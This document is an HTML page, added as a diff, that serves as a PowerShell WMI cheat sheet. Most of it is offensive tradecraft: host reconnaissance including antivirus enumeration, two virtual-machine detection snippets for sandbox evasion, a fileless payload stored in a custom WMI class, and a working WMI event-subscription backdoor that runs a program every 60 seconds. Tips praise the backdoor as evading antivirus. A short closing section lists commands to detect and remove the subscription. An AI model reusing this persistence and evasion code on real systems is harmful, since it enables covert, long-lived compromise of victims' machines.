@@ -1,0 +1,121 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>PowerShell WMI Commands</title>
+</head><body><b>File / Directory List</b><br/>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem<br/>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem<br/>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_BIOS<br/>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class CIM_DataFile &nbsp;<br/>
+<b><br/>
+</b><b>Disk Volume List</b><br/>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Volume &nbsp;<br/>
+<br/>
+<b>Registry Operations</b><br/>
+Get-WmiObject -Namespace ROOT\DEFAULT -Class StdRegProv Push-Location HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run Get-ItemProperty OptionalComponents &nbsp;<br/>
+<br/>
+<b>Process</b><br/>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process &nbsp;<br/>
+<br/>
+<b>List Service</b><br/>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service &nbsp;<br/>
+<br/>
+<b>Logs</b><br/>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_NtLogEvent &nbsp;<br/>
+<br/>
+<b>Logged On User</b><br/>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_LoggedOnUser &nbsp;<br/>
+<br/>
+<b>Share</b><br/>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Share &nbsp;<br/>
+<b><br/>
+</b><b>Patches</b><br/>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_QuickFixEngineering &nbsp;<br/>
+<br/>
+<b>AV Product</b><br/>
+Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct &nbsp;<br/>
+<br/>
+<b>VM Detection through PhysicalMemory and LogicalProcessors</b><br/>
+$VMDetected = $False<br/>
+$Arguments = @{<br/>
+&nbsp;Class = 'Win32_ComputerSystem'<br/>
+&nbsp;Filter = 'NumberOfLogicalProcessors &lt; 2 AND TotalPhysicalMemory &lt; 2147483648'<br/>
+}<br/>
+if (Get-WmiObject @Arguments) { <br/>
+$VMDetected = $True<br/>
+"In vm"<br/>
+&nbsp;} <br/>
+&nbsp;else{<br/>
+&nbsp;"Not in vm"<br/>
+&nbsp;}<br/>
+<br/>
+<b>VM Detection through VMWare process</b><br/>
+$VMwareDetected = $False<br/>
+$VMAdapter = Get-WmiObject Win32_NetworkAdapter -Filter 'Manufacturer LIKE<br/>
+"%VMware%" OR Name LIKE "%VMware%"'<br/>
+$VMBios = Get-WmiObject Win32_BIOS -Filter 'SerialNumber LIKE "%VMware%"'<br/>
+$VMToolsRunning = Get-WmiObject Win32_Process -Filter 'Name="vmtoolsd.exe"'<br/>
+if ($VMAdapter -or $VMBios -or $VMToolsRunning) <br/>
+{ $VMwareDetected = $True <br/>
+"in vm"<br/>
+} <br/>
+else<br/>
+{<br/>
+"not in vm"<br/>
+}<br/>
+<br/>
+<b>Persistence Payload</b><br/>
+$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,<br/>
+$null)<br/>
+$StaticClass.Name = 'Win32_EvilClass'<br/>
+$StaticClass.Put()<br/>
+$StaticClass.Properties.Add('EvilProperty' , "This is payload")<br/>
+$StaticClass.Put() <br/>
+It can be encrypted and saved at this position, decoded when executing to achieve that no file is saved on the drive.<br/>
+<br/>
+<br/>
+<b>Program Running Stealthily at regular time (requires admin)</b><br/>
+$filterName = 'BotFilter82'<br/>
+$consumerName = 'BotConsumer23'<br/>
+$exePath = 'C:\Windows\System32\notepad.exe'<br/>
+$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE<br/>
+TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"<br/>
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=<br/>
+<br/>
+$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop<br/>
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @<br/>
+<br/>
+{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}<br/>
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=<br/>
+<br/>
+$WMIEventFilter;Consumer=$WMIEventConsumer}<br/>
+<br/>
+Execute notepad.exe every 60s<br/>
+Tips<br/>
+The stuxnet has already used this backdoor that is implemted through mof.<br/>
+Until today many are using this backdoor method.<br/>
+AV products won’t kill this behavior.<br/>
+<br/>
+<br/>
+<b>Detection with WMI<br/>
+</b><b>View WMI Event</b>&nbsp;requires admin<br/>
+<b>#List Event Filters</b><br/>
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter<br/>
+<br/>
+<b>#List Event Consumers</b><br/>
+Get-WMIObject -Namespace root\Subscription -Class __EventConsumer<br/>
+<br/>
+<b>#List Event Bindings</b><br/>
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding<br/>
+<br/>
+Delete requires admin<br/>
+<b>#Filter</b><br/>
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilter82'" | Remove-WmiObject -Verbose<br/>
+<br/>
+<b>#Consumer</b><br/>
+Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumer23'" | Remove-WmiObject -Verbose<br/>
+<br/>
+<b>#Binding</b><br/>
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose<br/>
+</body></html>
